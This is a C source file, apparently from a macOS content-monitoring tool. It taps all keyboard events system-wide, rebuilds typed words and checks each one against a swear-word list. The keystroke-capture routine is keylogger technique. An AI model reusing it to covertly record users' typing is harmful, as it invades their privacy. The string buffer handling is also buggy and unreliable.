#include <stdlib.h>
#include "keystrokes_analyst.h"
#include "connection.h"
#include "data_analyzer.h"

char * curr_tested_word;
int curr_tested_word_len = 0;

void * start_keystrokes_analyst(){
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL);

    if(!eventTap) 
        exit(1);

    // initialize the loop source event
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    
    time_t result = time(NULL);
    
    //start the event loop run
    CFRunLoopRun();
    return 0;
}

CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    main_data data;
    char curr_keystroke[3];
    FILE * event_log;
    
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp)
         return event; 
        
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    strcpy(curr_keystroke, convert_key_code(keyCode));
    #ifdef USER_MESSAGE_PROMPT
        printf("%s", curr_keystroke);
        fflush(stdout);
    #endif
    if (strcmp(curr_keystroke, "_") == 0 || strcmp(curr_keystroke, "R") == 0){
        check_for_forbidden_content(curr_tested_word, "typed", swear_words_array, num_of_swear_words);
        memset(curr_tested_word, '\0', curr_tested_word_len);
        curr_tested_word_len = 0;
        curr_tested_word = (char *) realloc(curr_tested_word, sizeof(char));
    }
    else {
        curr_tested_word = (char *) realloc(curr_tested_word, ++curr_tested_word_len * sizeof(char));
        strcat(curr_tested_word, curr_keystroke);
    }    
    return event;
}

static const char * convert_key_code (int keyCode) {
    switch ((int) keyCode) {
        case 0:   return "a";
        case 1:   return "s";
        case 2:   return "d";
        case 3:   return "f";
        case 4:   return "h";
        case 5:   return "g";
        case 6:   return "z";
        case 7:   return "x";
        case 8:   return "c";
        case 9:   return "v";
        case 11:  return "b";
        case 12:  return "q";
        case 13:  return "w";
        case 14:  return "e";
        case 15:  return "r";
        case 16:  return "y";
        case 17:  return "t";
        case 18:  return "1";
        case 19:  return "2";
        case 20:  return "3";
        case 21:  return "4";
        case 22:  return "6";
        case 23:  return "5";
        case 24:  return "=";
        case 25:  return "9";
        case 26:  return "7";
        case 27:  return "-";
        case 28:  return "8";
        case 29:  return "0";
        case 30:  return "]";
        case 31:  return "o";
        case 32:  return "u";
        case 33:  return "[";
        case 34:  return "i";
        case 35:  return "p";
        case 36:  return "R";
        case 37:  return "l";
        case 38:  return "j";
        case 39:  return "'";
        case 40:  return "k";
        case 41:  return ";";
        case 42:  return "\\";
        case 43:  return ",";
        case 44:  return "/";
        case 45:  return "n";
        case 46:  return "m";
        case 47:  return ".";
        case 50:  return "`";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 49:  return "_";
        case 51:  return "\b";
    }
    return "";
}